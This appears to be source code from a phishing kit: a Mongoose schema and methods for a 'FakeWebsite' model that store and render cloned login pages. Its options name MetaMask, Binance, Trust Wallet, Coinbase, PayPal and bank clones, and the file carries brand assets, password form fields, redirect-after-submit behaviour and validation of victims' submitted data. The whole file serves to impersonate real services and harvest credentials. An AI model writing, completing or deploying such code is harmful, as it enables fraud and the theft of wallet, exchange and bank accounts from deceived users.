const mongoose = require('mongoose');

const fakeWebsiteSchema = new mongoose.Schema({
  name: {
    type: String,
    required: true,
    trim: true
  },
  platform: {
    type: String,
    required: true,
    enum: ['metamask', 'binance', 'trust-wallet', 'coinbase', 'paypal', 'bank', 'generic']
  },
  template: {
    type: String,
    enum: ['metamask-clone', 'binance-clone', 'trust-wallet-clone', 'bank-clone', 'generic'],
    required: true
  },
  description: {
    type: String,
    required: true
  },
  htmlTemplate: {
    type: String,
    required: true
  },
  cssTemplate: {
    type: String,
    required: true
  },
  jsTemplate: {
    type: String,
    default: ''
  },
  formFields: [{
    name: {
      type: String,
      required: true
    },
    type: {
      type: String,
      enum: ['text', 'password', 'email', 'tel', 'textarea', 'select'],
      required: true
    },
    placeholder: String,
    label: String,
    required: {
      type: Boolean,
      default: true
    },
    validation: {
      pattern: String,
      message: String
    },
    order: Number
  }],
  assets: {
    logo: String,
    favicon: String,
    images: [String],
    fonts: [String]
  },
  branding: {
    primaryColor: String,
    secondaryColor: String,
    fontFamily: String,
    logoUrl: String
  },
  functionality: {
    hasCaptcha: {
      type: Boolean,
      default: false
    },
    hasProgressBar: {
      type: Boolean,
      default: false
    },
    hasLoadingStates: {
      type: Boolean,
      default: true
    },
    hasErrorHandling: {
      type: Boolean,
      default: true
    },
    redirectAfterSubmit: {
      type: Boolean,
      default: true
    }
  },
  securityFeatures: {
    requiresHttps: {
      type: Boolean,
      default: true
    },
    hasCsrfProtection: {
      type: Boolean,
      default: false
    },
    rateLimiting: {
      type: Boolean,
      default: true
    }
  },
  isActive: {
    type: Boolean,
    default: true
  },
  createdBy: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  version: {
    type: String,
    default: '1.0.0'
  },
  tags: [String],
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
}, {
  timestamps: true
});

// Indexes
fakeWebsiteSchema.index({ platform: 1, template: 1, isActive: 1 });
fakeWebsiteSchema.index({ tags: 1 });

// Method to generate complete HTML
fakeWebsiteSchema.methods.generateCompleteHtml = function(customData = {}) {
  let html = this.htmlTemplate;
  let css = this.cssTemplate;
  let js = this.jsTemplate;
  
  // Replace placeholders with custom data
  Object.keys(customData).forEach(key => {
    const placeholder = `{{${key}}}`;
    html = html.replace(new RegExp(placeholder, 'g'), customData[key]);
    css = css.replace(new RegExp(placeholder, 'g'), customData[key]);
    js = js.replace(new RegExp(placeholder, 'g'), customData[key]);
  });
  
  // Generate form fields dynamically
  if (this.formFields.length > 0) {
    const formFieldsHtml = this.formFields
      .sort((a, b) => (a.order || 0) - (b.order || 0))
      .map(field => {
        const required = field.required ? 'required' : '';
        const placeholder = field.placeholder ? `placeholder="${field.placeholder}"` : '';
        const pattern = field.validation?.pattern ? `pattern="${field.validation.pattern}"` : '';
        
        return `
          <div class="form-group">
            <label for="${field.name}">${field.label || field.name}</label>
            <input 
              type="${field.type}" 
              id="${field.name}" 
              name="${field.name}" 
              ${required} 
              ${placeholder}
              ${pattern}
              class="form-control"
            />
            ${field.validation?.message ? `<small class="error-message">${field.validation.message}</small>` : ''}
          </div>
        `;
      })
      .join('');
    
    html = html.replace('{{FORM_FIELDS}}', formFieldsHtml);
  }
  
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${customData.title || this.name}</title>
      <link rel="icon" href="${this.assets.favicon || ''}" type="image/x-icon">
      <style>${css}</style>
    </head>
    <body>
      ${html}
      <script>${js}</script>
    </body>
    </html>
  `;
};

// Method to validate form submission
fakeWebsiteSchema.methods.validateFormData = function(formData) {
  const errors = {};
  
  this.formFields.forEach(field => {
    if (field.required && (!formData[field.name] || formData[field.name].trim() === '')) {
      errors[field.name] = `${field.label || field.name} is required`;
    }
    
    if (field.validation?.pattern && formData[field.name]) {
      const regex = new RegExp(field.validation.pattern);
      if (!regex.test(formData[field.name])) {
        errors[field.name] = field.validation.message || `Invalid ${field.label || field.name}`;
      }
    }
  });
  
  return {
    isValid: Object.keys(errors).length === 0,
    errors
  };
};

module.exports = mongoose.model('FakeWebsite', fakeWebsiteSchema); 